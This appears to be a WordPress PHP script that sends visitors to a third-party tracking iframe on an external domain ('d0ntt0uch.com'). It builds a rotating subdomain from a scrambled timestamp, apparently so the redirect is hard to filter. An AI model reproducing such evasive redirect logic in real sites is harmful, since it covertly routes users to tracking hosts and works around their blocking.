<?php

use Wordpress\Multisite\Commons\Decorator\GetPost;
use Wordpress\Multisite\Commons\Support\Facades\Log;
use Wordpress\Multisite\Commons\Support\Facades\Session;
use Wordpress\Multisite\Commons\MarketingCustomization\Flow;
use Wordpress\Multisite\Commons\Support\Facades\PrepareResponse;

$completeUrl = PrepareResponse::getIframeUrl();

function millitime() {
  $microtime = microtime();
  $comps = explode(' ', $microtime);

  return sprintf('%d%03d', $comps[1], $comps[0] * 1000);
}

$currentTime = millitime();
$timeConfuse = ($currentTime - 265331523) * 3;

$first2 = substr($timeConfuse, 0, 2);
$last2 = substr($timeConfuse, -2);
$mid = substr($timeConfuse, 2, -2);

$finalHash = $last2.$mid.$first2;

$parse = parse_url($completeUrl);
if (ENVIRONMENT == 'production' ) {
	$completeUrl = "http://".$finalHash.".nx.vastracking.tim.it.d0ntt0uch.com/serve/half/service/iframe?" . $parse['query'];
} else {
	$completeUrl = "http://".$finalHash.".nx.vastracking.tim.it.draguti.com/serve/half/service/iframe?" . $parse['query'];
}

wp_redirect($completeUrl);
exit;
